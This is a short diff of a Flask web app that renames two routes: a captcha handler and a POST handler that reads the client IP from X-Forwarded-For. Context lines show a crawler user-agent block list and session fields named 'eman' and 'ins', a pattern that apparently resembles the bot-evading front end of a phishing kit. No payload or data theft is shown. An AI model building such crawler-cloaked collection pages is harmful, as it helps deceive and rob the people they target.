@@ -77,7 +77,7 @@ bot_user_agents = [
 "crawler"
 ]
 
-@app.route('/m', methods=['GET', 'POST'])
+@app.route('/', methods=['GET', 'POST'])
 def captcha():
 
     if request.method == 'GET':
@@ -133,7 +133,7 @@ def route2():
     return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
 
-@app.route("/", methods=['POST'])
+@app.route("/first", methods=['POST'])
 def first():
     if request.method == 'POST':
         ip = request.headers.get('X-Forwarded-For')
